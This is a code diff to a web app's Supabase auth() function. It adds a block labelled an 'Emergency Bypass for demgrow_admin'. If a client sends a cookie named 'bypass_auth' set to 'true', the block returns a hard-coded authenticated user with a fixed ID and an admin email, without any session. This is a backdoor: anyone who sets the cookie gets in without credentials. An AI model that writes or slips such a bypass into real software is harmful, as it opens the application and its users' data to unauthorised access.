@@ -24,6 +24,18 @@ export async function auth() {
 
     const { data: { session } } = await supabase.auth.getSession();
     
+    // Emergency Bypass for demgrow_admin
+    if (!session && cookieStore.get('bypass_auth')?.value === 'true') {
+        return {
+            session: null,
+            user: {
+                id: '00000000-0000-0000-0000-000000000000',
+                email: 'admin@demgrow.space',
+                role: 'authenticated',
+            } as any,
+        };
+    }
+    
     return {
         session,
         user: session?.user ?? null,
